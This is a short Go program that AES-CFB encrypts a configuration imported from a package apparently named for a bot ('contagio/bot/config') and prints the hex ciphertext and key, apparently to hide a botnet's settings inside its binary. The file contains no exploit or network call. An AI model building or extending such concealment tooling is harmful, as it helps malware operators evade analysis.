package main

import (
	"contagio/bot/config"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	random "math/rand"
	"time"
)

func main() {

	plain := config.CONFIG
	key := genKey(32)
	encrypted := Encrypt(key, plain)

	fmt.Println("================ CONFIG ================\n\n" + hex.EncodeToString([]byte(encrypted)))

	println("\n================ KEY ================\n")
	for i, b := range key {
		if i > 0 {
			fmt.Print(", ")
		}
		fmt.Print(b)
	}
	println("\n")
}

func Encrypt(key []byte, plain string) string {
	byteMsg := []byte(plain)
	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}

	cipherText := make([]byte, aes.BlockSize+len(byteMsg))
	iv := cipherText[:aes.BlockSize]
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		return ""
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], byteMsg)

	return base64.StdEncoding.EncodeToString(cipherText)
}

func genKey(length int) []byte {
	s1 := random.NewSource(time.Now().UnixNano())
	r1 := random.New(s1)
	const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$^&()-+"
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = chars[r1.Intn(len(chars))]
	}
	return result
}
